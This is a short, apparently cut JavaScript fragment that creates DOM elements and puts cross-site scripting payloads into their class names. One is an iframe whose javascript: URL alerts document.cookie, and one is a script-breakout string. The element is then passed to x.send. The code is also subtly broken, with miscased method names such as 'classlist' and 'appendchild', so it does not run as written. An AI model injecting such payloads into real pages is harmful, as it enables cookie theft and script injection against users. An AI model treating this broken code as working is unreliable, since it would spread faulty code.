		newItem.classlist.add('><iframe src='javascript:alert(document.cookie)'></iframe>');
		let newsubmenu=document.createElement('ul');
	newsubmenu.classlist.add('</script><script>alert(1)</script>');
	newItem.appendchild(newsubmenu);
    x.send(newItem);
}
